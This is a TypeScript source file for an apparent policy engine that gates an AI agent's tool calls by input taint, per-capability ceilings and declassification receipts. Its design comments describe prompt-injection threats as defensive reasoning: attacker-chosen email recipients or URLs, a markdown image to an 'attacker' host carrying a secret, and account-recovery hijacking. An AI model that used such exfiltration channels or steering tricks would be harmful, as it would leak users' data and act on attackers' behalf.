// The truth table, and the engine that reads it. This is the whole library; everything else is
// plumbing around it.
//
// ONE TABLE, READ TWICE. `decide` and `checkContainment` both read CAPABILITY_POLICY. If the engine
// owned its own notion of what is permitted and the checker owned another, they would drift, and
// the checker would start certifying whatever the engine happened to do. That is the failure mode
// this whole library is arguing against, so it must not be the failure mode of the library itself.
//
// The drift is never random. It is asymmetric and always in the same direction: engines get
// loosened under delivery pressure. A customer needs file_write at UNTRUSTED_EXTERNAL for one
// workflow, the ceiling moves, the build goes red, and the checker gets loosened to match. With two
// tables that is two diffs, in two files, on two different days, and the second is indistinguishable
// from a bug fix. With one table it is a single reviewable line sitting next to the `rationale`
// string it now contradicts.
//
// WHAT THE ENGINE MAY NOT DO. `decide` contains no taint-level string literal. It compares only
// through `taintAtMost` and reads ceilings out of the row, so a threshold cannot be written down
// anywhere but this table. `test/contract.test.ts` fails the build if one appears.
//
// The engine is pure and synchronous: no clock, no randomness, no I/O, and it NEVER throws for any
// input including a malformed one. A policy engine that throws is a policy engine whose caller
// writes a try/catch, and that catch block is the bypass.

import {
  ALL_PARAM_ROLES,
  type ActionArg,
  type Capability,
  type Decision,
  type Effect,
  type EffectClass,
  type EgressClass,
  type ParamRole,
  type ProposedAction,
  type Provenance,
  type Reason,
  type ReasonCode,
  type ReceiptId,
  type Source,
  type SourceId,
  type Taint,
  type Verdict,
  joinTaint,
  taintAtMost,
  taintOf,
} from "./types.js";

// ---------------------------------------------------------------------------------------------
// Declassification rules, named. What each one can and cannot admit lives in declassify.ts.
// ---------------------------------------------------------------------------------------------

/** The named ways a value can be admitted above a ceiling. Causes, so `lower_snake`. */
export type DeclassificationRule =
  /** A human ratified this exact quoted value for this exact capability. */
  | "user_confirmed_value"
  /** The value is a member of a finite set fixed before any untrusted content was read. */
  | "allowlist_member"
  /** A number inside a bound whose endpoints are clean. */
  | "numeric_envelope"
  /** The value is an element selected out of a collection we already held cleanly. */
  | "clean_selection"
  /** The value is byte-identical to something we already held cleanly. */
  | "echo_of_clean"
  /**
   * Something holding a key vouched for this exact value, for this exact slot.
   *
   * Admissible only on capabilities with no effect and no full egress - a signature attests origin,
   * not content safety, so it can feed a read but must never steer a send.
   */
  | "attested_tool_output"
  /**
   * A human ratified a COMBINATION of values together, as one decision.
   *
   * Distinct from `user_confirmed_value` and not reducible to several of them: confirming a
   * recipient and separately confirming an amount is two decisions about two values, and neither
   * asked the question the pair poses.
   */
  | "tuple_confirmed";

/** Every rule, for iteration and exhaustiveness checks in tests. */
export const ALL_DECLASSIFICATION_RULES: readonly DeclassificationRule[] = [
  "user_confirmed_value",
  "allowlist_member",
  "numeric_envelope",
  "clean_selection",
  "echo_of_clean",
  "attested_tool_output",
  "tuple_confirmed",
] as const;

// ---------------------------------------------------------------------------------------------
// The row
// ---------------------------------------------------------------------------------------------

/** A per-role ceiling. Absent roles fall back to the row's `defaultCeiling`. */
export type RoleCeilings = Partial<Readonly<Record<ParamRole, Taint>>>;

/**
 * One combination that has to be approved as a unit.
 *
 * Declarative and per capability, rather than a condition buried in the engine. The engine reads
 * this list and knows nothing about what a payment or an email is - which is the same anti-drift
 * argument as `CAPABILITY_POLICY` itself: a reviewer who reads no TypeScript can still see which
 * combinations the policy treats as one decision, and a change to that set is a visible line in a
 * diff rather than a branch somebody has to find.
 */
export interface TuplePolicy {
  /** Stable name, so a refusal can say which combination was not reviewed. */
  readonly id: string;
  /** The roles that form the combination. Two or more; one role is not a tuple. */
  readonly roles: readonly ParamRole[];
  /** Why these belong together. Quoted into the refusal. */
  readonly why: string;
}

export interface CapabilityRow {
  /**
   * The row's own key. Redundant with its position in the record, and that redundancy is the point:
   * a copy-pasted row that forgets to change this is otherwise invisible, and `policy.test.ts`
   * asserts `CAPABILITY_POLICY[k].capability === k` for every k.
   */
  readonly capability: Capability;
  readonly effect: EffectClass;
  readonly egress: EgressClass;
  /** Ceiling for any role not named in `roleCeilings`. */
  readonly defaultCeiling: Taint;
  /** Per-argument ceilings. The mechanism that stops this library from being unusable. */
  readonly roleCeilings: RoleCeilings;
  /** Required regardless of taint. A property of the EFFECT axis, not the taint axis. */
  readonly requiresConfirmation: boolean;
  /**
   * This capability produces a DRAFT for a human to inspect, not an effect on the world.
   *
   * Changes one thing: an argument that exceeds its ceiling escalates to `NEEDS_REVIEW` instead of
   * being refused. Building the artifact is how the human gets something to look at, so refusing to
   * build it removes the review step rather than protecting anything.
   *
   * DELIBERATELY NARROW, and enforced rather than trusted. `policy.test.ts` and `prepare.test.ts`
   * both assert that a draft capability has `effect: "none"` AND `egress: "none"` AND does not
   * require confirmation, so this flag is unsettable on anything that acts. Without that invariant
   * it would be one careless edit away from being a general downgrade of every steering ceiling,
   * which is exactly what the fail-closed rule exists to prevent.
   *
   * The draft still carries its taint. Preparation does not launder: the artifact inherits the join
   * of its inputs and the broadcast sees it, or the two rows compose into a laundering pipeline.
   */
  readonly draftOnly?: boolean;
  /**
   * Any ONE of these admits a value above the ceiling. EMPTY MEANS THE CEILING IS ABSOLUTE, and the
   * engine must answer DENY rather than NEEDS_DECLASSIFICATION - see the livelock note in `decide`.
   */
  readonly liftableBy: ReadonlySet<DeclassificationRule>;
  /**
   * Combinations that must be reviewed TOGETHER when their members were admitted separately.
   *
   * Receipts are per value, and two individually-admissible values can be an attack as a pair: a
   * recipient from a valid allowlist plus an amount inside a valid envelope is a correctly-formed
   * transfer to the wrong person. Each receipt answers a question nobody asked about the other.
   *
   * DELIBERATELY NARROW. The check fires only when two or more of these roles were DECLASSIFIED
   * separately - not merely present. Values already within their ceilings raise no tuple question,
   * because nothing had to be admitted. That scoping is what stops this from becoming a rules engine
   * that fires on every call and gets switched off.
   */
  readonly tuplePolicies?: readonly TuplePolicy[];
  /** Quoted verbatim into refusals, so a denial carries the argument and not just a code. */
  readonly approvalBoundary: string;
}

export type CapabilityPolicy = Readonly<Record<Capability, CapabilityRow>>;

const lift = (...rules: DeclassificationRule[]): ReadonlySet<DeclassificationRule> =>
  new Set(rules);

/**
 * THE TABLE. Every threshold in the library is here and nowhere else.
 *
 * The two axes are genuinely orthogonal, and one cell proves it: `web_fetch` is
 * (effect none, egress full) and `account_modify` is (effect irreversible, egress metadata). Any
 * single sensitivity scale must order one above the other, and both orderings are wrong for a real
 * threat. Collapse to one axis and `web_fetch` sorts next to `text_response` - both harmless! -
 * which is exactly how the most common real exfiltration path gets waved through.
 */
export const CAPABILITY_POLICY: CapabilityPolicy = {
  // ---- effect none, egress none: untrusted content is SUPPOSED to reach here ------------------
  text_response: {
    capability: "text_response",
    effect: "none",
    egress: "none",
    // The top of the lattice, deliberately. This row is the thesis. A design that refuses to let
    // untrusted content reach a text answer has not contained anything, it has broken the product.
    // It is also the release valve that stops over-tainting from making the library unusable.
    //
    // The `egress: none` rating rests on ONE assumption that must be written down rather than
    // assumed: the rendering surface does not auto-fetch. A markdown client that resolves
    // ![](https://attacker/?secret) has turned this row into web_fetch, and then this row is wrong.
    defaultCeiling: "UNTRUSTED_EXTERNAL",
    // RATED EXPLICITLY, and the empty object it replaced was a latent availability failure.
    //
    // `ceilingFor` fails closed: an unrated STEERING role clamps to USER_CONTROLLED regardless of
    // `defaultCeiling`. That rule is right for every row that acts - forgetting to rate a role must
    // never be the loosening - and it is wrong here, because this row cannot act. With `roleCeilings`
    // empty and `liftableBy` empty, a `text_response` whose argument was declared `sink_identity`
    // returned a flat DENY with no route out: the release valve refusing, on a capability that
    // changes nothing and sends nothing. Exactly the composition that produced defect §7 on
    // transaction_prepare, on the one row the whole design leans on.
    //
    // A no-effect, no-egress row has nothing for a steering value to steer, so every role is at the
    // top of the lattice - and `validatePolicy` now REQUIRES such a row to say so, rather than
    // leaving the next author to discover the clamp. See docs/DEFECTS_FOUND.md §12.
    roleCeilings: {
      sink_identity: "UNTRUSTED_EXTERNAL",
      magnitude: "UNTRUSTED_EXTERNAL",
      control: "UNTRUSTED_EXTERNAL",
    },
    requiresConfirmation: false,
    liftableBy: lift(),
    approvalBoundary: "Answers the user. Performs no tool call and sends nothing outward.",
  },

  read_only_tool: {
    capability: "read_only_tool",
    effect: "none",
    egress: "metadata",
    // Reading is free; exfiltration is not. An untrusted-directed read pulls data into context and
    // that feels like it should be gated - but gating it here gates the wrong thing, because
    // nothing changed and nothing left. The confidentiality risk is entirely downstream at the
    // egress capabilities, which is where it IS gated. Gate both and you get a system so
    // restrictive that the first production incident is somebody disabling it.
    defaultCeiling: "UNTRUSTED_EXTERNAL",
    roleCeilings: { sink_identity: "TOOL_DERIVED", control: "TOOL_DERIVED" },
    requiresConfirmation: false,
    tuplePolicies: [
      {
        // `control`, not `selector`. A selector on this row sits at the top of the lattice and is
        // therefore never declassified, so a combination naming it could never fire - which an
        // invariant in tuple.test.ts caught the moment it was written. A dead policy looks like
        // coverage and is none.
        id: "target_and_control",
        roles: ["sink_identity", "control"],
        why: "which system is queried and how - the pair decides what leaves in the arguments",
      },
    ],
    liftableBy: lift(
      "allowlist_member",
      "clean_selection",
      "attested_tool_output",
      "tuple_confirmed",
    ),
    approvalBoundary: "Reads and returns. Changes nothing, but its arguments still leave a trace.",
  },

  transaction_prepare: {
    capability: "transaction_prepare",
    effect: "none",
    egress: "none",
    // Preparing is not acting. This row exists so the prepare/broadcast split is worth having: rate
    // them the same and the split buys nothing, so everyone collapses them into one call and the
    // agent ends up holding a signing key.
    //
    // The split invites exactly one catastrophic bug: PREPARATION DOES NOT LAUNDER TAINT. The
    // artifact a prepare produces carries the join of the inputs that produced it, and the
    // broadcast sees that join. Without that rule the two rows compose into a laundering pipeline.
    defaultCeiling: "UNTRUSTED_EXTERNAL",
    roleCeilings: {},
    requiresConfirmation: false,
    // The fix for defect #7. Steering roles still fail closed to USER_CONTROLLED - the ceiling is
    // NOT loosened - but exceeding it now escalates rather than refusing, because the thing being
    // refused was the construction of the draft a human was meant to review.
    draftOnly: true,
    liftableBy: lift(),
    approvalBoundary:
      "Builds an unsigned transaction for a human to inspect. Does not sign, submit, or grant " +
      "delegated authority.",
  },

  // ---- the row the two-axis model exists for --------------------------------------------------
  web_fetch: {
    capability: "web_fetch",
    effect: "none",
    egress: "full",
    // No side effect at all, and a complete exfiltration channel, because the URL IS the payload:
    // path, query, subdomain, and the DNS lookup itself.
    //
    // `requiresConfirmation` is false and that is NOT an oversight. A human cannot audit a URL for
    // a secret encoded in a path segment. Asking them produces a dialog that is always clicked
    // through, which is worse than no dialog because it manufactures consent. So this row is
    // liftable only by rules a machine can actually check.
    defaultCeiling: "UNTRUSTED_EXTERNAL",
    roleCeilings: { sink_identity: "USER_CONTROLLED", control: "USER_CONTROLLED" },
    requiresConfirmation: false,
    liftableBy: lift("allowlist_member", "clean_selection", "echo_of_clean"),
    approvalBoundary: "Fetches a URL. The destination is chosen by whoever supplied it.",
  },

  file_write: {
    capability: "file_write",
    effect: "reversible",
    egress: "none",
    // The path is the risk; the bytes much less so. Writing a tool-produced summary to disk is the
    // normal case and denying it kills the product. Both ratings are conditional on the write
    // landing in a sandbox root that is not synced - a write into a web root or a shared drive is
    // full egress with extra steps.
    defaultCeiling: "UNTRUSTED_EXTERNAL",
    roleCeilings: { sink_identity: "USER_CONTROLLED", control: "USER_CONTROLLED" },
    requiresConfirmation: false,
    tuplePolicies: [
      {
        id: "path_and_mode",
        roles: ["sink_identity", "control"],
        why: "where it lands and whether it truncates - append and overwrite are different acts",
      },
    ],
    liftableBy: lift(
      "user_confirmed_value",
      "allowlist_member",
      "echo_of_clean",
      "tuple_confirmed",
    ),
    approvalBoundary: "Writes a file. The path decides what is overwritten.",
  },

  email_send: {
    capability: "email_send",
    effect: "irreversible",
    egress: "full",
    // THE ROLE ROW. A completely untrusted BODY sent to a recipient the user typed is the ordinary
    // use of an email assistant. A perfectly clean body sent to a recipient chosen by an inbound
    // email is a breach. One ceiling per capability cannot say that, forces you to declassify the
    // body, and gets the library removed in week three.
    defaultCeiling: "UNTRUSTED_EXTERNAL",
    // `magnitude` is rated EXPLICITLY even though `ceilingFor` would tighten it anyway. The fallback
    // is a backstop against an omission, not a substitute for stating the policy: a row should read
    // correctly to someone who does not know the fallback rule exists. This one was genuinely
    // missing - a policy invariant test caught it inheriting the permissive default, which is right
    // for a mail body and wrong for anything that steers the send (recipient count, attachment
    // size, a bulk flag).
    roleCeilings: {
      sink_identity: "USER_CONTROLLED",
      magnitude: "USER_CONTROLLED",
      control: "USER_CONTROLLED",
    },
    requiresConfirmation: false,
    // Recipient and control flags, NOT recipient and body. See the note in DECLASSIFICATION.md: a
    // body sits at UNTRUSTED_EXTERNAL and is therefore never declassified, so a (sink_identity,
    // payload) tuple could never fire. Declaring a policy that cannot trigger would look like
    // coverage and be none - the same shape as the v0 laundering case that aimed and missed.
    tuplePolicies: [
      {
        id: "recipient_and_control",
        roles: ["sink_identity", "control"],
        why: "who receives it and how it is sent - reply-all to an untrusted address is the pair",
      },
    ],
    liftableBy: lift(
      "user_confirmed_value",
      "allowlist_member",
      "echo_of_clean",
      "tuple_confirmed",
    ),
    approvalBoundary: "Sends mail. Unsend is a client-side illusion; treat it as irreversible.",
  },

  payment: {
    capability: "payment",
    effect: "irreversible",
    egress: "full",
    // Always confirms, even at CLEAN, and that is the row showing confirmation is not a taint gate.
    // `requiresConfirmation` is driven by the effect axis alone: a large transfer assembled
    // entirely from SYSTEM text still gets a human, because the failure being defended against
    // there is not injection, it is the agent being wrong.
    defaultCeiling: "TOOL_DERIVED",
    roleCeilings: { sink_identity: "USER_CONTROLLED", magnitude: "USER_CONTROLLED" },
    requiresConfirmation: true,
    tuplePolicies: [
      {
        id: "recipient_and_amount",
        roles: ["sink_identity", "magnitude"],
        why: "a valid payee and a valid amount are a correctly-formed transfer to the wrong person",
      },
    ],
    liftableBy: lift(
      "user_confirmed_value",
      "allowlist_member",
      "numeric_envelope",
      "tuple_confirmed",
    ),
    approvalBoundary: "Moves money. There is no undo.",
  },

  account_modify: {
    capability: "account_modify",
    effect: "irreversible",
    egress: "metadata",
    // THE CONFUSED-DEPUTY ROW. This is the only capability that can change the policy under which
    // every FUTURE decision is made: rotate the recovery address and every subsequent confirmation
    // prompt goes to the attacker. A capability that can lower the ceiling on all other
    // capabilities cannot itself be gated by a liftable rule, because the lift is then a bootstrap.
    //
    // Note the egress rating is only `metadata` and this is still one of the two strictest rows. A
    // one-dimensional scale sorted on egress puts it below web_fetch, which is the second cell
    // proving the axes are orthogonal.
    defaultCeiling: "USER_CONTROLLED",
    roleCeilings: { sink_identity: "CLEAN", control: "CLEAN" },
    requiresConfirmation: true,
    // NO TUPLE POLICY, and its removal in v0.8 is a correction rather than a loosening.
    //
    // `target_and_setting` used to sit here and could never fire. The combination gate catches values
    // that were admitted SEPARATELY - each lifted by its own receipt, with the pair being the attack.
    // This row's `liftableBy` is empty, so nothing is ever admitted separately and the gate was never
    // reached. It read as protection in the table and was not any.
    //
    // The intent was sound and is worth restoring the day this row gains a liftable rule; until then
    // a dead check is worse than no check, because a reader counts it. `validatePolicy` now refuses
    // any tuple on a row with no liftable rule. See docs/DEFECTS_FOUND.md §13.
    liftableBy: lift(),
    approvalBoundary: "Changes keys, recovery, or permissions - including the ones guarding this.",
  },

  transaction_broadcast: {
    capability: "transaction_broadcast",
    effect: "irreversible",
    egress: "full",
    // Differs from wallet_sign by one fact that justifies them being separate capabilities: a
    // broadcast is SIMULATABLE. You can dry-run it and show a human the actual balance deltas, so a
    // human declassification here is meaningful.
    defaultCeiling: "USER_CONTROLLED",
    roleCeilings: { sink_identity: "CLEAN", magnitude: "CLEAN", control: "CLEAN" },
    requiresConfirmation: true,
    tuplePolicies: [
      {
        id: "recipient_and_amount",
        roles: ["sink_identity", "magnitude"],
        why: "the destination and the value moved are one decision, not two",
      },
      {
        id: "recipient_and_asset",
        roles: ["sink_identity", "selector"],
        why: "which asset goes where - the right amount of the wrong token is still a loss",
      },
    ],
    liftableBy: lift("user_confirmed_value", "tuple_confirmed"),
    approvalBoundary: "Submits a signed transaction. Once it lands it cannot be recalled.",
  },

  wallet_sign: {
    capability: "wallet_sign",
    effect: "irreversible",
    egress: "full",
    // THE STRICTEST ROW IN THE TABLE, stricter than payment, and it should be. A payment is
    // bounded: one amount, one recipient, one time. A signature is a UNIVERSAL, TRANSFERABLE
    // authorisation whose blast radius is not a function of its bytes - an unlimited-approval call
    // is a few dozen bytes, and a message signed for one chain replays on another.
    //
    // A declassification receipt is a claim about content. There is no claim about content that
    // bounds what a counterparty will do with a signature, so NOTHING lifts this row. If a workflow
    // needs to sign under taint, the answer is a narrower capability with its own row, not a
    // loosening of this one.
    defaultCeiling: "CLEAN",
    roleCeilings: {},
    requiresConfirmation: true,
    liftableBy: lift(),
    approvalBoundary: "Produces a signature. What a counterparty does with it is unbounded.",
  },
} as const;

/**
 * Roles that decide WHERE an action goes or HOW MUCH it moves, as opposed to what it carries.
 *
 * The distinction matters because an unrated steering role is a hole and an unrated payload role is
 * usually fine: an untrusted email body is the product, an untrusted recipient is the attack.
 */
const STEERING_ROLES: ReadonlySet<ParamRole> = new Set<ParamRole>([
  "sink_identity",
  "magnitude",
  "control",
]);

/**
 * Every role the lattice actually knows.
 *
 * Needed because "not a steering role" and "not a role at all" are different facts, and only one of
 * them is safe to treat as `content`. See `ceilingFor`.
 */
const KNOWN_ROLES: ReadonlySet<ParamRole> = new Set<ParamRole>(ALL_PARAM_ROLES);

/**
 * The ceiling for one role of one capability.
 *
 * FAILING TO RATE A STEERING ROLE TIGHTENS IT, NEVER LOOSENS IT. An omitted steering role falls back
 * to the stricter of the row's default and `USER_CONTROLLED`, not to the default alone.
 *
 * This is not defensive tidiness, it is a bug that was actually in this table: `email_send` rates
 * `sink_identity` and leaves `magnitude` unrated, so it inherited the row's deliberately permissive
 * `UNTRUSTED_EXTERNAL` default - which is right for a mail body and wrong for anything that steers
 * the send. A policy invariant test caught it. Every row will eventually be edited by someone in a
 * hurry, and the direction an omission fails in is a design decision rather than an accident. Same
 * posture as the sibling scanner's per-program capability model: an undeclared capability is not
 * allowed, rather than allowed by default.
 */
export const ceilingFor = (row: CapabilityRow, role: ParamRole): Taint => {
  const explicit = row.roleCeilings[role];
  if (explicit !== undefined) return explicit;
  // AN UNRECOGNISED ROLE IS NOT A NON-STEERING ROLE, and conflating the two failed OPEN. `ParamRole`
  // is a closed union, so anything outside it is a caller bug or a payload nobody validated - but
  // the check below only asks whether the role is in the STEERING set, and a typo is not, so it
  // collected `defaultCeiling`: the LOOSEST ceiling the row has. On `email_send` that turned a
  // WEB-derived recipient into an ALLOW purely by misspelling `sink_identity`. The one thing an
  // unknown role cannot be assumed to be is harmless, so it admits clean input and nothing else.
  // See DEFECTS_FOUND.md section 25.
  if (!KNOWN_ROLES.has(role)) return "CLEAN";
  if (!STEERING_ROLES.has(role)) return row.defaultCeiling;
  return taintAtMost(row.defaultCeiling, "USER_CONTROLLED")
    ? row.defaultCeiling
    : "USER_CONTROLLED";
};

// ---------------------------------------------------------------------------------------------
// Input to the engine
// ---------------------------------------------------------------------------------------------

/** A receipt as the engine sees it. Issuing one lives in declassify.ts. */
export interface ReceiptEvidence {
  readonly id: ReceiptId;
  readonly rule: DeclassificationRule;
  readonly capability: Capability;
  readonly role: ParamRole;
  /**
   * The argument LABEL this receipt was issued for. A receipt is never a bearer token.
   *
   * A label alone is not an identity - see `argPath`. Kept because it is what an issuer naturally
   * knows, and because a name that occurs once in an action IS its slot, which covers almost every
   * real call.
   */
  readonly argName: string;
  /**
   * The argument SLOT this receipt was issued for, when the issuer can say.
   *
   * This is the binding that actually holds. When present it must equal the slot the engine computes
   * for the argument, so a receipt for `recipients[0]` cannot admit `recipients[1]`. When absent the
   * receipt falls back to matching by label, and that fallback works ONLY where the label is
   * unambiguous within the action. See docs/ARGUMENT_IDENTITY.md and defect §11.
   */
  readonly argPath?: string;
  /** The highest taint this receipt admits. */
  readonly lifts: Taint;
  /** The value it admits. Checked against the argument's value when the caller supplies one. */
  readonly admitted?: unknown;
  /** When it is good for, and which source it is bound to. */
  readonly scope?: {
    readonly nonce: string;
    readonly issuedAt: number;
    readonly expiresAt: number | null;
    readonly source: SourceId | null;
  };
}

export interface DecisionInput {
  readonly action: ProposedAction;
  /** Every origin in play. Model output must declare `derivedFrom`, or laundering is free. */
  readonly sources: readonly Source[];
  readonly receipts?: readonly ReceiptEvidence[];
  /** True when a human has confirmed this action. The shell owns the prompt; the engine does not. */
  readonly confirmed?: boolean;
  /**
   * Receipts already spent, supplied by the shell's ledger.
   *
   * The engine holds no state between calls, so single-use cannot be enforced inside it. Threading
   * the ledger through the call signature is what makes forgetting it visible: a caller who passes
   * nothing gets unlimited reuse, and that is a documented limitation rather than a silent one.
   */
  readonly spentReceipts?: ReadonlySet<ReceiptId>;
  /**
   * The current time, from the caller. The engine reads no clock.
   *
   * Omitting it disables expiry checking entirely rather than defaulting to "now", because a default
   * clock in a pure function is a lie that only shows up when two runs of the same input disagree.
   */
  readonly now?: number;
}

// ---------------------------------------------------------------------------------------------
// The engine
// ---------------------------------------------------------------------------------------------

const reason = (code: ReasonCode, message: string, extra?: Partial<Reason>): Reason => ({
  code,
  message,
  ...(extra ?? {}),
});

/** A source resolved through its whole ancestry: the join, and everything that contributed. */
interface ResolvedSource {
  readonly taint: Taint;
  readonly provenance: ReadonlySet<Provenance>;
}

/**
 * The top of the lattice, attributed to nobody.
 *
 * Returned for the two malformed graphs: an edge pointing at a source that was never declared, and
 * a cycle. Neither is memoised. A dangling edge is a fact about the graph, but a cycle is a fact
 * about the PATH that reached it, and caching a path-dependent answer under a node id is how a
 * cache starts lying.
 */
const UNRESOLVABLE: ResolvedSource = {
  taint: "UNTRUSTED_EXTERNAL",
  provenance: new Set<Provenance>(),
};

/**
 * Resolve a source to its taint, following `derivedFrom` so model output inherits the join of
 * everything it was shown.
 *
 * ITERATIVE, AND THE THREE PIECES EACH PAY FOR THEMSELVES.
 *
 * `onPath` is the CURRENT PATH, not everything visited. Until v1.0 one set was shared across a
 * node's siblings and never unwound, so a node reached by a SECOND path was misread as a cycle and
 * resolved to the top of the lattice. A diamond - one document, two extracts, one summary - is the
 * ordinary shape of `derivedOutput`, and every node in such a graph could be CLEAN while the join
 * still came back UNTRUSTED_EXTERNAL. That failed closed, so it refused rather than leaked; it
 * refused work nobody had a reason to refuse. See DEFECTS_FOUND.md section 23.
 *
 * `memo` is what makes unwinding affordable. Unwinding the path WITHOUT a memo is exponential in
 * the number of stacked diamonds - a 61-node graph costs 4.2 million visits - which would have
 * traded a wrong answer for a hang. An entry is written only once a node has fully resolved and
 * left the path. A cycle resolves to the TOP of the lattice, so a value learned on a path that hit
 * one can only ever be too strict: the memo cannot lower a taint, only raise it.
 *
 * The explicit `stack` is why the walk cannot throw. Recursion died with a RangeError on a chain
 * about ten thousand deep, and a policy engine that throws is a policy engine whose caller writes a
 * try/catch - and that catch block is the bypass. See DEFECTS_FOUND.md section 24.
 */
function resolveTaint(
  root: SourceId,
  byId: ReadonlyMap<string, Source>,
  memo: Map<string, ResolvedSource>,
): ResolvedSource {
  interface Frame {
    readonly id: string;
    readonly parents: readonly SourceId[];
    next: number;
    taint: Taint;
    readonly provenance: Set<Provenance>;
  }

  const onPath = new Set<string>();
  const stack: Frame[] = [];

  /** Begin a node: either it answers at once, or a frame is pushed and this returns `undefined`. */
  const enter = (id: string): ResolvedSource | undefined => {
    const hit = memo.get(id);
    if (hit !== undefined) return hit;
    const found = byId.get(id);
    if (found === undefined || onPath.has(id)) return UNRESOLVABLE;
    onPath.add(id);
    stack.push({
      id,
      parents: Array.isArray(found.derivedFrom) ? found.derivedFrom : [],
      next: 0,
      taint: taintOf(found.provenance) ?? "UNTRUSTED_EXTERNAL",
      provenance: new Set<Provenance>([found.provenance]),
    });
    return undefined;
  };

  let settled = enter(root as string);
  if (settled !== undefined) return settled;

  while (stack.length > 0) {
    const frame = stack[stack.length - 1] as Frame;

    // Fold in whatever the previous turn of the loop finished.
    if (settled !== undefined) {
      frame.taint = joinTaint(frame.taint, settled.taint);
      for (const p of settled.provenance) frame.provenance.add(p);
      settled = undefined;
    }

    if (frame.next < frame.parents.length) {
      settled = enter(frame.parents[frame.next++] as string);
      continue;
    }

    stack.pop();
    onPath.delete(frame.id);
    settled = { taint: frame.taint, provenance: frame.provenance };
    memo.set(frame.id, settled);
  }

  return settled ?? UNRESOLVABLE;
}

/**
 * Find the receipt that covers this argument, and say why the others did not.
 *
 * Checks run in a deliberate order: REPLAY FIRST, because it is the only rejection whose reason is
 * evidence of an adversary rather than of a bug, and a receipt can fail several checks at once while
 * the log keeps whichever fired first. Check capability first and a replayed receipt that also has
 * the wrong capability is logged as a mismatch, and the attack signal is gone.
 */
function coverFor(
  a: ArgAssessment,
  input: DecisionInput,
  row: CapabilityRow,
  capability: Capability,
  /**
   * Receipts already used by an earlier argument of THIS action.
   *
   * A receipt binds to a slot by `(capability, role, argName)`, and until v0.8 that was believed to
   * name exactly one slot. It does not: two arguments may share a name. Two parameters both called
   * `url`, one allowlist receipt for one URL, and BOTH were admitted - one human approval of one
   * value silently covering a second, arbitrary one. The reason codes even said `declassified`
   * twice, and the ledger spent the id once because spending is idempotent, so the audit trail
   * recorded nothing unusual.
   *
   * See docs/DEFECTS_FOUND.md §11.
   *
   * THIS IS THE v0.8 MITIGATION, AND IT IS REACHABLE. The paragraph below said otherwise for three
   * releases; a receipt search built in v1.0.1 reaches it directly and deleting the guard produces
   * hundreds of findings. Two receipt objects sharing one id, bound to two different slots of one
   * action, get past the slot model entirely - the model makes ONE receipt match one slot, and says
   * nothing about two objects carrying the same id. See DEFECTS_FOUND.md sections 34 and 35.
   *
   * The class fix is the SLOT model above - `slotsOf`, `argPath`, and a label-only receipt matching
   * nothing where the label repeats. Together those make a receipt match AT MOST ONE slot, so
   * `usedReceipts` can never already hold it.
   *
   * An earlier version of this paragraph said the guard was "almost unreachable" and "still catches
   * the case where a caller gives two arguments the same explicit `path`". THAT SENTENCE WAS FALSE.
   * Colliding explicit paths are suffixed by rule 4 of `slotsOf` - args `[{name:"a",path:"p"},
   * {name:"b",path:"p"}]` produce slots `["p","p#1"]` - so a receipt with `argPath: "p"` admits
   * exactly one of them and the guard still does not fire FOR THAT SHAPE. The sweep behind the old
   * "unreachable" claim passed ONE receipt object per call, and one object can never collide with
   * itself - it was structurally incapable of reaching this branch, so its zero was a fact about the
   * sweep rather than about the guard. Its stated size is also not reproducible from anything in the
   * tree. Both are recorded in DEFECTS_FOUND.md section 35.
   *
   * It is kept rather than deleted because it is a fail-closed backstop costing one set lookup, and
   * because the property that makes it dead - slot uniqueness - is exactly the kind of invariant a
   * later refactor could weaken without noticing. `unguarded.test.ts` asserts BOTH halves: that no
   * receipt covers two slots, and that this guard is currently unreachable. If slot uniqueness ever
   * breaks, that test fails and says this guard has come alive, rather than letting it sit here
   * looking like protection that was never needed.
   *
   * Recorded as confirmed-dead in docs/DEFECTS_FOUND.md §20. This is the SECOND false claim removed
   * from this comment block; the first was corrected in v0.9 and is described below.
   *
   * An earlier version of this comment claimed a second fix - "rejecting duplicate argument names
   * outright" - that was never written. Nothing enforced it and nothing could have; duplicate labels
   * are legitimate (an array parameter), which is why the fix is slots rather than a ban. Corrected
   * in v0.9, in the same spirit as defect §6.
   */
  usedReceipts: ReadonlySet<ReceiptId>,
): { readonly covering: ReceiptEvidence | undefined; readonly rejections: readonly Reason[] } {
  const rejections: Reason[] = [];
  const spent = input.spentReceipts;
  const now = input.now;

  for (const r of input.receipts ?? []) {
    // ---- SLOT MATCHING, and the fail-closed half is the point ----------------------------------
    // An explicit `argPath` must equal the slot exactly: a receipt for `recipients[0]` has nothing to
    // say about `recipients[1]`.
    //
    // A label-only receipt falls back to matching by name, and ONLY where that name identifies one
    // argument. Where the label repeats, a label-only receipt matches NOTHING - not the first, not
    // the last. Its issuer cannot have meant one rather than the other, so neither is a safe guess,
    // and guessing is exactly how defect §11 admitted an argument nobody approved.
    if (r.argPath !== undefined && r.argPath !== "") {
      if (r.argPath !== a.slot) continue;
    } else if (!a.labelIsUnambiguous) {
      rejections.push(
        reason(
          "receipt_capability_mismatch",
          `receipt ${r.id} names the label "${r.argName}", which identifies more than one argument of this action; a receipt must name a slot (argPath) to admit one of them`,
        ),
      );
      continue;
    } else if (r.argName !== a.arg.name) {
      // Not for this slot at all. Silent: a receipt for another argument is ordinary, not suspicious.
      continue;
    }

    if (usedReceipts.has(r.id)) {
      rejections.push(
        reason(
          "receipt_already_consumed",
          `receipt ${r.id} already admitted an earlier argument of this action; one receipt admits one value into one slot`,
        ),
      );
      continue;
    }

    if (spent?.has(r.id)) {
      rejections.push(
        reason("receipt_already_consumed", `receipt ${r.id} for "${a.arg.name}" has been spent`),
      );
      continue;
    }
    if (now !== undefined && r.scope?.expiresAt != null && now > r.scope.expiresAt) {
      rejections.push(
        reason(
          "receipt_expired",
          `receipt ${r.id} for "${a.arg.name}" expired at ${r.scope.expiresAt}`,
        ),
      );
      continue;
    }
    if (r.capability !== capability || r.role !== a.arg.role) {
      rejections.push(
        reason(
          "receipt_capability_mismatch",
          `receipt ${r.id} was issued for ${r.capability}/${r.role}, not ${capability}/${a.arg.role}`,
        ),
      );
      continue;
    }
    // Value binding. Only checkable when the caller supplied the argument's value - and when it did,
    // this is what closes the check-versus-use gap: the receipt must admit THIS value, not a value.
    if (
      a.arg.value !== undefined &&
      r.admitted !== undefined &&
      String(r.admitted) !== a.arg.value
    ) {
      rejections.push(
        reason(
          "receipt_value_mismatch",
          `receipt ${r.id} admits ${JSON.stringify(String(r.admitted))}, not ` +
            `${JSON.stringify(a.arg.value)}`,
        ),
      );
      continue;
    }
    // Source binding. Two emails can name the same address; only one of them was confirmed.
